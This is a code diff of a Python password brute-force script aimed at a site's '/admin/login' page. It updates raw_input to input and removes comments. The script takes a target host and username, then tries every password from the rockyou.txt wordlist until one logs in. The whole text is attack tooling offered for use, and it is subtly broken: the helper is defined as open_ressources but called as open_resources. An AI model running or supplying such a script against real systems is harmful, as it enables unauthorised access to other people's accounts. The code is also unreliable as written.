@@ -7,10 +7,10 @@ import requests
 def open_ressources(file_path):
   return [item.replace("\n", "") for item in open(file_path).readlines()]
   
-host = raw_input("Enter host to bruteforce: ")
-login_url = 'http://' + host + '/admin/login'     //CHANGE THIS IF NECESARY
-username = raw_input("Enter the user name: ")
-wordlist = open_resources("/usr/share/wordlists/rockyou.txt")   //CHANGE THIS IF YOU WANT
+host = input("Enter host to bruteforce: ")
+login_url = 'http://' +host + '/admin/login'   
+username = input("Enter the user name: ")
+wordlist = open_resources("/usr/share/wordlists/rockyou.txt")  
 
 for password in wordlist:
   session = requests.Session()
@@ -41,6 +41,3 @@ for password in wordlist:
       break
 else:
   print('Password not found in the Wordlist')
-
-
-
